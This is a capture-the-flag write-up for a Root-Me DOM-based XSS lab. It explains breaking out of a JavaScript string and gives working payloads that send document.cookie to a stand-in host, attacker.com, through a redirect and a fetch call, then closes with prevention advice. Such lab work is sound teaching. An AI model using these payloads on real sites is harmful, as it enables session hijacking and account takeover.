# XSS DOM-Based - Introduction
[Root-Me Challenge Proof](https://www.root-me.org/?page=validation&id_challenge=2914&id_auteur=1089475&lang=en)

## Lab Overview

This lab demonstrates a **DOM-Based Cross-Site Scripting (XSS)** vulnerability.

Unlike reflected or stored XSS, the payload is executed entirely inside the browser through client-side JavaScript.

The vulnerable application reads data from a URL parameter and inserts it directly into a JavaScript variable without proper sanitization.

---

# Identifying the Injection Point

Parameter:

```text
http://challenge01.root-me.org/web-client/ch32/index.php?number=nnn
```
<img width="1868" height="579" alt="image" src="https://github.com/user-attachments/assets/6870f972-7d17-43eb-be1e-700b1ebfe617" />


The value is reflected inside a script block:

```javascript
var random = Math.random() * (99);
var number = 'nnn';

if(random == number) {
    document.getElementById('state').style.color = 'green';
    document.getElementById('state').innerHTML =
        'You won this game but you don\'t have the flag ;)';
}
else{
    document.getElementById('state').style.color = 'red';
    document.getElementById('state').innerText =
        'Sorry, wrong answer ! The right answer was ' + random;
}
```

Notice:

```javascript
var number = 'USER_INPUT';
```

User-controlled input is placed directly inside a JavaScript string.

This is the vulnerability.

---

# Confirming XSS

Payload:

```text
?number=1';alert(1)//
```

Resulting script:

```javascript
var number = '1';
alert(1)//';
```

Explanation:

1. `'` closes the original string
2. `alert(1)` executes arbitrary JavaScript
3. `//` comments out the remaining quote

Browser interprets it as valid JavaScript and executes the payload.

---

# Why This Is DOM-Based XSS

The payload is injected into JavaScript code and executed by the browser.

Characteristics:

- No HTML injection required
- No `<script>` tag required
- JavaScript context breakout
- Execution happens client-side

---

# Why the Fetch Payload Failed

Attempted payload:

```javascript
fetch('http://attacker.com/c?='document.cookie)//
```

Problem:

```javascript
'http://attacker.com/c?='document.cookie
```

is invalid JavaScript syntax.

JavaScript expects concatenation:

```javascript
'http://attacker.com/c?=' + document.cookie
```

or

```javascript
`http://attacker.com/c?=${document.cookie}`
```

Without the operator, the browser throws a syntax error and stops execution.

Simplified example:

Invalid:

```javascript
'hello'document.cookie
```

Valid:

```javascript
'hello' + document.cookie
```

---

# Why the Redirect Payload Worked

Working payload:

```javascript
';document.location.href=
'http://attacker.com/?itworks='
.concat(document.cookie);// 
```

Resulting script:

```javascript
var number = '';

document.location.href =
'http://attacker.com/?itworks='
.concat(document.cookie);

//';
```

---

# What Happens Internally

### Step 1

Break out of the string:

```javascript
';
```

Original assignment ends.

---

### Step 2

Execute attacker-controlled JavaScript:

```javascript
document.location.href =
'http://attacker.com/?itworks='
.concat(document.cookie);
```

---

### Step 3

Browser navigates to:

```text
http://attacker.com/?itworks=COOKIE_VALUE
```

---

### Step 4

The browser sends an HTTP request to the attacker server.

Example:

```http
GET /?itworks=PHPSESSID=abc123
```

The attacker receives the cookie value.

---

### Step 5

Comment out the remainder:

```javascript
//
```

Prevents syntax errors from the trailing quote.

---

# Why `.concat()` Works

This:

```javascript
'http://attacker.com/?itworks='
.concat(document.cookie)
```

is equivalent to:

```javascript
'http://attacker.com/?itworks=' + document.cookie
```

Example:

```javascript
document.cookie
```

returns:

```text
PHPSESSID=abc123
```

Final URL becomes:

```text
http://attacker.com/?itworks=PHPSESSID=abc123
```
<img width="1252" height="500" alt="image" src="https://github.com/user-attachments/assets/0e65828e-a085-45ef-b966-d4bab8d0c55f" />

---

# Key Learning Points

- DOM XSS occurs entirely in the browser
- JavaScript context is critical when crafting payloads
- Breaking out of quotes is a common exploitation technique
- `//` is often used to neutralize trailing code
- Cookie theft commonly uses:
  - redirects
  - image requests
  - fetch/XMLHttpRequest requests
- Payload syntax matters; a small JavaScript error can completely break exploitation

---

# Security Impact

Successful DOM XSS can lead to:

- Session hijacking
- Account takeover
- Credential theft
- CSRF bypasses
- Malicious actions on behalf of users

---

# Prevention

Never place user input directly into JavaScript code:

```javascript
var number = userInput;
```

Use:

- Context-aware output encoding
- Safe DOM APIs
- Input validation
- Content Security Policy (CSP)

Instead of:

```javascript
element.innerHTML = userInput;
```

prefer:

```javascript
element.textContent = userInput;
```
